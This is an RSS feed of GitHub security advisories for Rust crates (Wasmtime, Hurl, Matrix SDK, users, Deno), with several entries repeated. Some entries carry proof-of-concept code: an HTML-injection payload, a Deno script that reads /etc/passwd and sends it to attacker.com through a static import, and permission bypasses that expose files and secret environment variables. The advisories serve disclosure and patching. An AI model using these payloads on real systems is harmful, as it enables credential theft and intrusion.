<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://xlordz.github.io/github-advisory-database-rss/rust.rss</id>
    <title>Security Advisory for Rust crates</title>
    <updated>2025-06-19T17:19:24.877Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust"/>
    <subtitle>Security Advisory for Rust crates on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[wasmtime-jit-debug] wasmtime_jit_debug Dumps Undefined Memory by `JitDumpFile`]]></title>
        <id>https://github.com/advisories/GHSA-9ghp-w2hm-vfpf</id>
        <link href="https://github.com/advisories/GHSA-9ghp-w2hm-vfpf"/>
        <updated>2025-06-17T15:37:57.000Z</updated>
        <content type="html"><![CDATA[<p>The unsound function <code>dump_code_load_record</code> uses <code>from_raw_parts</code> to directly convert the pointer <code>addr</code> and <code>len</code> into a slice without any validation and that memory block would be dumped.</p>
<p>Thus, the 'safe' function dump_code_load_record is actually 'unsafe' since it requires the caller to guarantee that the addr is valid and len must not overflow. Otherwise, the function could dump the memory into file illegally, causing memory leak.</p>
<blockquote>
<p><strong>Note</strong>: this is an internal-only crate in the Wasmtime project not intended for external use and is more strongly signaled nowadays as of <a href="https://github.com/bytecodealliance/wasmtime/pull/10963">bytecodealliance/wasmtime#10963</a>. Please open an issue in Wasmtime if you're using this crate directly.</p>
</blockquote>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/bytecodealliance/wasmtime/issues/8905">https://github.com/bytecodealliance/wasmtime/issues/8905</a></li>
<li><a href="https://github.com/bytecodealliance/wasmtime/commit/b5e31a5c33725ab8a7dfbe8505c56b5cf282ffed">https://github.com/bytecodealliance/wasmtime/commit/b5e31a5c33725ab8a7dfbe8505c56b5cf282ffed</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0442.html">https://rustsec.org/advisories/RUSTSEC-2024-0442.html</a></li>
<li><a href="https://github.com/advisories/GHSA-9ghp-w2hm-vfpf">https://github.com/advisories/GHSA-9ghp-w2hm-vfpf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9ghp-w2hm-vfpf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-17T15:37:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[hurl] Regex literal in Hurl files are not escaped when exported to HTML, allowing injections]]></title>
        <id>https://github.com/advisories/GHSA-v33j-v3x4-42qg</id>
        <link href="https://github.com/advisories/GHSA-v33j-v3x4-42qg"/>
        <updated>2025-06-11T14:46:39.000Z</updated>
        <content type="html"><![CDATA[<p>Given this Hurl file:</p>
<p>regex.hurl:</p>
<pre><code>GET https://foo.com
HTTP 200
[Asserts]
jsonpath "$.body" matches /&lt;img src="" onerror="alert('Hi!')"&gt;/
</code></pre>
<p>When exported to HTML:</p>
<pre><code>$ hurlfmt --out html regex.hurl
&lt;pre&gt;&lt;code class="language-hurl"&gt;&lt;span class="hurl-entry"&gt;&lt;span class="request"&gt;&lt;span class="line"&gt;&lt;span class="method"&gt;GET&lt;/span&gt; &lt;span class="url"&gt;https://foo.com&lt;/span&gt;&lt;/span&gt;
&lt;/span&gt;&lt;span class="response"&gt;&lt;span class="line"&gt;&lt;span class="version"&gt;HTTP&lt;/span&gt; &lt;span class="number"&gt;200&lt;/span&gt;&lt;/span&gt;
&lt;span class="line"&gt;&lt;span class="section-header"&gt;[Asserts]&lt;/span&gt;&lt;/span&gt;
&lt;span class="line"&gt;&lt;span class="query-type"&gt;jsonpath&lt;/span&gt; &lt;span class="string"&gt;"$.body"&lt;/span&gt; &lt;span class="predicate-type"&gt;matches&lt;/span&gt; &lt;span class="regex"&gt;/&lt;img src="" onerror="alert('Hi!')"&gt;/&lt;/span&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
</code></pre>
<p>The regex literal <code>/&lt;img src="" onerror="alert('Hi!')"&gt;/</code> is not escaped:</p>
<p><code>&lt;span class="regex"&gt;/&lt;img src="" onerror="alert('Hi!')"&gt;/&lt;/span&gt;&lt;/span&gt;</code></p>
<p>When opened in a browser, the code is run without user interaction:</p>
<p><img alt="regex" src="https://github.com/user-attachments/assets/9c20a2ff-900f-4420-b38b-1e7648749119"></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Orange-OpenSource/hurl/security/advisories/GHSA-v33j-v3x4-42qg">https://github.com/Orange-OpenSource/hurl/security/advisories/GHSA-v33j-v3x4-42qg</a></li>
<li><a href="https://github.com/Orange-OpenSource/hurl/commit/248ac41cfa1797c52241c6ef756490d90027cdf2">https://github.com/Orange-OpenSource/hurl/commit/248ac41cfa1797c52241c6ef756490d90027cdf2</a></li>
<li><a href="https://github.com/Orange-OpenSource/hurl/commit/7dcdbd1796785392b1e829d1f07c6687b9a8f27d">https://github.com/Orange-OpenSource/hurl/commit/7dcdbd1796785392b1e829d1f07c6687b9a8f27d</a></li>
<li><a href="https://github.com/advisories/GHSA-v33j-v3x4-42qg">https://github.com/advisories/GHSA-v33j-v3x4-42qg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v33j-v3x4-42qg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-11T14:46:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[matrix-sdk-crypto] matrix-sdk-crypto vulnerable to sender of encrypted events being spoofed by homeserver administrator]]></title>
        <id>https://github.com/advisories/GHSA-x958-rvg6-956w</id>
        <link href="https://github.com/advisories/GHSA-x958-rvg6-956w"/>
        <updated>2025-06-12T21:23:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>matrix-sdk-crypto since version 0.8.0 up to 0.11.0 does not correctly validate the sender of an encrypted event. Accordingly, a malicious homeserver operator can modify events served to clients, making those events appear to the recipient as if they were sent by another user.</p>
<p>Although the CVSS score is 4.9 (AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:N), we consider this a High Severity security issue.</p>
<h3 id="details">Details</h3>
<p>The Matrix specification <a href="https://spec.matrix.org/v1.14/client-server-api/#mmegolmv1aes-sha2">requires</a> that clients ensure that "the eventâ€™s <code>sender</code>, <code>room_id</code>, and the recorded <code>session_id</code> match a trusted session". The vulnerable matrix-sdk-crypto versions check that the <code>room_id</code> matches that of the session denoted by <code>session_id</code>, but do not check the <code>sender</code>.</p>
<h3 id="patches">Patches</h3>
<p>The issue is resolved by <a href="https://github.com/matrix-org/matrix-rust-sdk/commit/13c1d2048286bbabf5e7bc6b015aafee98f04d55">13c1d20</a>, included in versions 0.11.1 and 0.12.0 of matrix-sdk-crypto.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Since a successful attack requires administrator access to the homeserver, users who trust the administrators of their local homeserver are not affected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://spec.matrix.org/v1.14/client-server-api/#mmegolmv1aes-sha2">https://spec.matrix.org/v1.14/client-server-api/#mmegolmv1aes-sha2</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/matrix-org/matrix-rust-sdk/security/advisories/GHSA-x958-rvg6-956w">https://github.com/matrix-org/matrix-rust-sdk/security/advisories/GHSA-x958-rvg6-956w</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48937">https://nvd.nist.gov/vuln/detail/CVE-2025-48937</a></li>
<li><a href="https://github.com/matrix-org/matrix-rust-sdk/commit/13c1d2048286bbabf5e7bc6b015aafee98f04d55">https://github.com/matrix-org/matrix-rust-sdk/commit/13c1d2048286bbabf5e7bc6b015aafee98f04d55</a></li>
<li><a href="https://github.com/matrix-org/matrix-rust-sdk/commit/56980745b4f27f7dc72ac296e6aa003e5d92a75b">https://github.com/matrix-org/matrix-rust-sdk/commit/56980745b4f27f7dc72ac296e6aa003e5d92a75b</a></li>
<li><a href="https://spec.matrix.org/v1.14/client-server-api/#mmegolmv1aes-sha2">https://spec.matrix.org/v1.14/client-server-api/#mmegolmv1aes-sha2</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2025-0041.html">https://rustsec.org/advisories/RUSTSEC-2025-0041.html</a></li>
<li><a href="https://github.com/advisories/GHSA-x958-rvg6-956w">https://github.com/advisories/GHSA-x958-rvg6-956w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x958-rvg6-956w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-10T20:15:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[users] Duplicate Advisory: users may append `root` to group listings]]></title>
        <id>https://github.com/advisories/GHSA-jq8x-v7jw-v675</id>
        <link href="https://github.com/advisories/GHSA-jq8x-v7jw-v675"/>
        <updated>2025-06-06T23:16:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-m65q-v92h-cm7q. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>A flaw was found in the user's crate for Rust. This vulnerability allows privilege escalation via incorrect group listing when a user or process has fewer than exactly 1024 groups, leading to the erroneous inclusion of the root group in the access list.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-5791">https://nvd.nist.gov/vuln/detail/CVE-2025-5791</a></li>
<li><a href="https://github.com/ogham/rust-users/issues/44">https://github.com/ogham/rust-users/issues/44</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2025-5791">https://access.redhat.com/security/cve/CVE-2025-5791</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2370001">https://bugzilla.redhat.com/show_bug.cgi?id=2370001</a></li>
<li><a href="https://crates.io/crates/users">https://crates.io/crates/users</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2025-0040.html">https://rustsec.org/advisories/RUSTSEC-2025-0040.html</a></li>
<li><a href="https://github.com/advisories/GHSA-jq8x-v7jw-v675">https://github.com/advisories/GHSA-jq8x-v7jw-v675</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jq8x-v7jw-v675</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-06T15:30:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deno] Deno vulnerable to Exposure of Sensitive Information to an Unauthorized Actor]]></title>
        <id>https://github.com/advisories/GHSA-jv4x-jv3h-qff5</id>
        <link href="https://github.com/advisories/GHSA-jv4x-jv3h-qff5"/>
        <updated>2025-06-05T01:21:08.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Static imports are exempted from the network permission check. An attacker could exploit this to leak the password file on the network.</p>
<h3 id="details">Details</h3>
<p>Static imports in Deno are exempted from the network permission check. This can be exploited by attackers in multiple ways, when third-party code is directly/indirectly executed with <code>deno run</code>:</p>
<ol>
<li>The simplest payload would be a tracking pixel-like import that attackers place in their code to find out when developers use the attacker-controlled code.</li>
<li>When <code>--allow-write</code> and <code>--allow-read</code> permissions are given, an attacker can perform a sophisticated two-steps attack: first, they generate a ts/js file containing a static import and in a second execution load this static file.</li>
</ol>
<h3 id="poc">PoC</h3>
<pre><code class="language-ts">const __filename = new URL("", import.meta.url).pathname;
let oldContent = await Deno.readTextFile(__filename);
let passFile = await Deno.readTextFile("/etc/passwd");
let pre =
  'import {foo} from "[https://attacker.com?val=](https://attacker.com/?val=)' +
  encodeURIComponent(passFile) + '";\n';
await Deno.writeTextFile(__filename, pre + oldContent);
</code></pre>
<p>Executing a file containing this payload twice, with <code>deno run --allow-read --allow-write</code> would cause the password file to leak on the network, even though no network permission was granted.</p>
<p>This vulnerability was fixed with the addition of the <code>--allow-import</code> flag: <a href="https://docs.deno.com/runtime/fundamentals/security/#network-access">https://docs.deno.com/runtime/fundamentals/security/#network-access</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-jv4x-jv3h-qff5">https://github.com/denoland/deno/security/advisories/GHSA-jv4x-jv3h-qff5</a></li>
<li><a href="https://github.com/advisories/GHSA-jv4x-jv3h-qff5">https://github.com/advisories/GHSA-jv4x-jv3h-qff5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jv4x-jv3h-qff5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-05T01:21:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[users] users may append `root` to group listings]]></title>
        <id>https://github.com/advisories/GHSA-m65q-v92h-cm7q</id>
        <link href="https://github.com/advisories/GHSA-m65q-v92h-cm7q"/>
        <updated>2025-06-06T23:16:39.000Z</updated>
        <content type="html"><![CDATA[<p>Affected versions append <code>root</code> to group listings, unless the correct listing has exactly 1024 groups.</p>
<p>This affects both:</p>
<ul>
<li>The supplementary groups of a user</li>
<li>The group access list of the current process</li>
</ul>
<p>If the caller uses this information for access control, this may lead to privilege escalation.</p>
<p>This crate is not currently maintained, so a patched version is not available.</p>
<p>Versions older than 0.8.0 do not contain the affected functions, so downgrading to them is a workaround.</p>
<h2 id="recommended-alternatives">Recommended alternatives</h2>
<ul>
<li><a href="https://crates.io/crates/uzers"><code>uzers</code></a> (an actively maintained fork of the <code>users</code> crate)</li>
<li><a href="https://crates.io/crates/sysinfo"><code>sysinfo</code></a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ogham/rust-users/issues/44">https://github.com/ogham/rust-users/issues/44</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2025-0040.html">https://rustsec.org/advisories/RUSTSEC-2025-0040.html</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-5791">https://nvd.nist.gov/vuln/detail/CVE-2025-5791</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2025-5791">https://access.redhat.com/security/cve/CVE-2025-5791</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2370001">https://bugzilla.redhat.com/show_bug.cgi?id=2370001</a></li>
<li><a href="https://github.com/advisories/GHSA-m65q-v92h-cm7q">https://github.com/advisories/GHSA-m65q-v92h-cm7q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m65q-v92h-cm7q</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-05T01:17:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[anon-vec] anon-vec lacks sufficient checks in public API]]></title>
        <id>https://github.com/advisories/GHSA-pr59-jjr4-gcf6</id>
        <link href="https://github.com/advisories/GHSA-pr59-jjr4-gcf6"/>
        <updated>2025-06-05T00:39:57.000Z</updated>
        <content type="html"><![CDATA[<p>The following functions in the anon-vec crate are unsound due to insufficient checks on their arguments::</p>
<ul>
<li><code>AnonVec::get_ref()</code></li>
<li><code>AnonVec::get_mut()</code></li>
<li><code>AnonVec::remove_get()</code></li>
</ul>
<p>The crate was built as a learning project and is not being maintained.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/RylanYancey/anon-vec">https://github.com/RylanYancey/anon-vec</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2025-0039.html">https://rustsec.org/advisories/RUSTSEC-2025-0039.html</a></li>
<li><a href="https://github.com/advisories/GHSA-pr59-jjr4-gcf6">https://github.com/advisories/GHSA-pr59-jjr4-gcf6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pr59-jjr4-gcf6</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-06-05T00:39:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deno_node] Deno has --allow-read / --allow-write permission bypass in `node:sqlite`]]></title>
        <id>https://github.com/advisories/GHSA-8vxj-4cph-c596</id>
        <link href="https://github.com/advisories/GHSA-8vxj-4cph-c596"/>
        <updated>2025-06-04T22:57:14.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>It is possible to bypass Deno's read/write permission checks by using <code>ATTACH DATABASE</code> statement.</p>
<h2 id="poc">PoC</h2>
<pre><code class="language-js">// poc.js
import { DatabaseSync } from "node:sqlite"

const db = new DatabaseSync(":memory:");
db.exec("ATTACH DATABASE 'test.db' as test;");

db.exec("CREATE TABLE test.test (id INTEGER PRIMARY KEY, name TEXT);");
</code></pre>
<pre><code>$ deno poc.js
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-8vxj-4cph-c596">https://github.com/denoland/deno/security/advisories/GHSA-8vxj-4cph-c596</a></li>
<li><a href="https://github.com/denoland/deno/commit/31a97803995bd94629528ba841b2418d3ca01860">https://github.com/denoland/deno/commit/31a97803995bd94629528ba841b2418d3ca01860</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48935">https://nvd.nist.gov/vuln/detail/CVE-2025-48935</a></li>
<li><a href="https://github.com/advisories/GHSA-8vxj-4cph-c596">https://github.com/advisories/GHSA-8vxj-4cph-c596</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8vxj-4cph-c596</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-04T21:22:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deno] Deno has --allow-read / --allow-write permission bypass in `node:sqlite`]]></title>
        <id>https://github.com/advisories/GHSA-8vxj-4cph-c596</id>
        <link href="https://github.com/advisories/GHSA-8vxj-4cph-c596"/>
        <updated>2025-06-04T22:57:14.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>It is possible to bypass Deno's read/write permission checks by using <code>ATTACH DATABASE</code> statement.</p>
<h2 id="poc">PoC</h2>
<pre><code class="language-js">// poc.js
import { DatabaseSync } from "node:sqlite"

const db = new DatabaseSync(":memory:");
db.exec("ATTACH DATABASE 'test.db' as test;");

db.exec("CREATE TABLE test.test (id INTEGER PRIMARY KEY, name TEXT);");
</code></pre>
<pre><code>$ deno poc.js
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-8vxj-4cph-c596">https://github.com/denoland/deno/security/advisories/GHSA-8vxj-4cph-c596</a></li>
<li><a href="https://github.com/denoland/deno/commit/31a97803995bd94629528ba841b2418d3ca01860">https://github.com/denoland/deno/commit/31a97803995bd94629528ba841b2418d3ca01860</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48935">https://nvd.nist.gov/vuln/detail/CVE-2025-48935</a></li>
<li><a href="https://github.com/advisories/GHSA-8vxj-4cph-c596">https://github.com/advisories/GHSA-8vxj-4cph-c596</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8vxj-4cph-c596</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-04T21:22:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deno_runtime] Deno.env.toObject() ignores the variables listed in --deny-env and returns all environment variables]]></title>
        <id>https://github.com/advisories/GHSA-7w8p-chxq-2789</id>
        <link href="https://github.com/advisories/GHSA-7w8p-chxq-2789"/>
        <updated>2025-06-04T22:57:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <a href="https://docs.deno.com/api/deno/~/Deno.Env.toObject">Deno.env.toObject</a> method ignores any variables listed in the <code>--deny-env</code> option of the <code>deno run</code> command. When looking at the <a href="https://docs.deno.com/runtime/fundamentals/security/#environment-variables">documentation</a> of the <code>--deny-env</code> option this might lead to a false impression that variables listed in the option are impossible to read.</p>
<h3 id="poc">PoC</h3>
<pre><code>export AWS_SECRET_ACCESS_KEY=my-secret-aws-key

# Works as expected. The program stops with a "NotCapable" error message
echo 'console.log(Deno.env.get("AWS_SECRET_ACCESS_KEY"));' | deno run \
  --allow-env \
  --deny-env=AWS_ACCESS_KEY_ID,AWS_SECRET_ACCESS_KEY -

# All enviroment variables are printed and the --deny-env list is completely disregarded
echo 'console.log(Deno.env.toObject());' | deno run \
  --allow-env \
  --deny-env=AWS_ACCESS_KEY_ID,AWS_SECRET_ACCESS_KEY -
</code></pre>
<p>The first example using <code>get</code> exits with the following error:</p>
<pre><code>error: Uncaught (in promise) NotCapable: Requires env access to "AWS_SECRET_ACCESS_KEY", run again with the --allow-env flag
console.log(Deno.env.get("AWS_SECRET_ACCESS_KEY"));
                     ^
    at Object.getEnv [as get] (ext:deno_os/30_os.js:124:10)
    at file:///$deno$stdin.mts:1:22
</code></pre>
<p>The second example  using <code>toObject</code> prints all environment variables:</p>
<pre><code>[Object: null prototype] {
  ...
  AWS_SECRET_ACCESS_KEY: "my-secret-aws-key",
  ...
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>Software relying on the combination of both flags to allow access to most environment variables except a few sensitive ones will be vulnerable to malicious code trying to steal secrets using the Deno.env.toObject() method.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-7w8p-chxq-2789">https://github.com/denoland/deno/security/advisories/GHSA-7w8p-chxq-2789</a></li>
<li><a href="https://github.com/denoland/deno/pull/29079">https://github.com/denoland/deno/pull/29079</a></li>
<li><a href="https://github.com/denoland/deno/commit/2959e083912420988066a001c2b2d6732a1b562f">https://github.com/denoland/deno/commit/2959e083912420988066a001c2b2d6732a1b562f</a></li>
<li><a href="https://github.com/denoland/deno/commit/946ccda1aa19a00c478a5e6826b75053b050d753">https://github.com/denoland/deno/commit/946ccda1aa19a00c478a5e6826b75053b050d753</a></li>
<li><a href="https://docs.deno.com/api/deno/~/Deno.Env.toObject">https://docs.deno.com/api/deno/~/Deno.Env.toObject</a></li>
<li><a href="https://docs.deno.com/runtime/fundamentals/security/#environment-variables">https://docs.deno.com/runtime/fundamentals/security/#environment-variables</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48934">https://nvd.nist.gov/vuln/detail/CVE-2025-48934</a></li>
<li><a href="https://github.com/advisories/GHSA-7w8p-chxq-2789">https://github.com/advisories/GHSA-7w8p-chxq-2789</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7w8p-chxq-2789</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-04T21:18:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deno] Deno.env.toObject() ignores the variables listed in --deny-env and returns all environment variables]]></title>
        <id>https://github.com/advisories/GHSA-7w8p-chxq-2789</id>
        <link href="https://github.com/advisories/GHSA-7w8p-chxq-2789"/>
        <updated>2025-06-04T22:57:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <a href="https://docs.deno.com/api/deno/~/Deno.Env.toObject">Deno.env.toObject</a> method ignores any variables listed in the <code>--deny-env</code> option of the <code>deno run</code> command. When looking at the <a href="https://docs.deno.com/runtime/fundamentals/security/#environment-variables">documentation</a> of the <code>--deny-env</code> option this might lead to a false impression that variables listed in the option are impossible to read.</p>
<h3 id="poc">PoC</h3>
<pre><code>export AWS_SECRET_ACCESS_KEY=my-secret-aws-key

# Works as expected. The program stops with a "NotCapable" error message
echo 'console.log(Deno.env.get("AWS_SECRET_ACCESS_KEY"));' | deno run \
  --allow-env \
  --deny-env=AWS_ACCESS_KEY_ID,AWS_SECRET_ACCESS_KEY -

# All enviroment variables are printed and the --deny-env list is completely disregarded
echo 'console.log(Deno.env.toObject());' | deno run \
  --allow-env \
  --deny-env=AWS_ACCESS_KEY_ID,AWS_SECRET_ACCESS_KEY -
</code></pre>
<p>The first example using <code>get</code> exits with the following error:</p>
<pre><code>error: Uncaught (in promise) NotCapable: Requires env access to "AWS_SECRET_ACCESS_KEY", run again with the --allow-env flag
console.log(Deno.env.get("AWS_SECRET_ACCESS_KEY"));
                     ^
    at Object.getEnv [as get] (ext:deno_os/30_os.js:124:10)
    at file:///$deno$stdin.mts:1:22
</code></pre>
<p>The second example  using <code>toObject</code> prints all environment variables:</p>
<pre><code>[Object: null prototype] {
  ...
  AWS_SECRET_ACCESS_KEY: "my-secret-aws-key",
  ...
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>Software relying on the combination of both flags to allow access to most environment variables except a few sensitive ones will be vulnerable to malicious code trying to steal secrets using the Deno.env.toObject() method.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-7w8p-chxq-2789">https://github.com/denoland/deno/security/advisories/GHSA-7w8p-chxq-2789</a></li>
<li><a href="https://github.com/denoland/deno/pull/29079">https://github.com/denoland/deno/pull/29079</a></li>
<li><a href="https://github.com/denoland/deno/commit/2959e083912420988066a001c2b2d6732a1b562f">https://github.com/denoland/deno/commit/2959e083912420988066a001c2b2d6732a1b562f</a></li>
<li><a href="https://github.com/denoland/deno/commit/946ccda1aa19a00c478a5e6826b75053b050d753">https://github.com/denoland/deno/commit/946ccda1aa19a00c478a5e6826b75053b050d753</a></li>
<li><a href="https://docs.deno.com/api/deno/~/Deno.Env.toObject">https://docs.deno.com/api/deno/~/Deno.Env.toObject</a></li>
<li><a href="https://docs.deno.com/runtime/fundamentals/security/#environment-variables">https://docs.deno.com/runtime/fundamentals/security/#environment-variables</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48934">https://nvd.nist.gov/vuln/detail/CVE-2025-48934</a></li>
<li><a href="https://github.com/advisories/GHSA-7w8p-chxq-2789">https://github.com/advisories/GHSA-7w8p-chxq-2789</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7w8p-chxq-2789</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-04T21:18:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deno] Deno.env.toObject() ignores the variables listed in --deny-env and returns all environment variables]]></title>
        <id>https://github.com/advisories/GHSA-7w8p-chxq-2789</id>
        <link href="https://github.com/advisories/GHSA-7w8p-chxq-2789"/>
        <updated>2025-06-04T22:57:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <a href="https://docs.deno.com/api/deno/~/Deno.Env.toObject">Deno.env.toObject</a> method ignores any variables listed in the <code>--deny-env</code> option of the <code>deno run</code> command. When looking at the <a href="https://docs.deno.com/runtime/fundamentals/security/#environment-variables">documentation</a> of the <code>--deny-env</code> option this might lead to a false impression that variables listed in the option are impossible to read.</p>
<h3 id="poc">PoC</h3>
<pre><code>export AWS_SECRET_ACCESS_KEY=my-secret-aws-key

# Works as expected. The program stops with a "NotCapable" error message
echo 'console.log(Deno.env.get("AWS_SECRET_ACCESS_KEY"));' | deno run \
  --allow-env \
  --deny-env=AWS_ACCESS_KEY_ID,AWS_SECRET_ACCESS_KEY -

# All enviroment variables are printed and the --deny-env list is completely disregarded
echo 'console.log(Deno.env.toObject());' | deno run \
  --allow-env \
  --deny-env=AWS_ACCESS_KEY_ID,AWS_SECRET_ACCESS_KEY -
</code></pre>
<p>The first example using <code>get</code> exits with the following error:</p>
<pre><code>error: Uncaught (in promise) NotCapable: Requires env access to "AWS_SECRET_ACCESS_KEY", run again with the --allow-env flag
console.log(Deno.env.get("AWS_SECRET_ACCESS_KEY"));
                     ^
    at Object.getEnv [as get] (ext:deno_os/30_os.js:124:10)
    at file:///$deno$stdin.mts:1:22
</code></pre>
<p>The second example  using <code>toObject</code> prints all environment variables:</p>
<pre><code>[Object: null prototype] {
  ...
  AWS_SECRET_ACCESS_KEY: "my-secret-aws-key",
  ...
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>Software relying on the combination of both flags to allow access to most environment variables except a few sensitive ones will be vulnerable to malicious code trying to steal secrets using the Deno.env.toObject() method.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-7w8p-chxq-2789">https://github.com/denoland/deno/security/advisories/GHSA-7w8p-chxq-2789</a></li>
<li><a href="https://github.com/denoland/deno/pull/29079">https://github.com/denoland/deno/pull/29079</a></li>
<li><a href="https://github.com/denoland/deno/commit/2959e083912420988066a001c2b2d6732a1b562f">https://github.com/denoland/deno/commit/2959e083912420988066a001c2b2d6732a1b562f</a></li>
<li><a href="https://github.com/denoland/deno/commit/946ccda1aa19a00c478a5e6826b75053b050d753">https://github.com/denoland/deno/commit/946ccda1aa19a00c478a5e6826b75053b050d753</a></li>
<li><a href="https://docs.deno.com/api/deno/~/Deno.Env.toObject">https://docs.deno.com/api/deno/~/Deno.Env.toObject</a></li>
<li><a href="https://docs.deno.com/runtime/fundamentals/security/#environment-variables">https://docs.deno.com/runtime/fundamentals/security/#environment-variables</a></li>
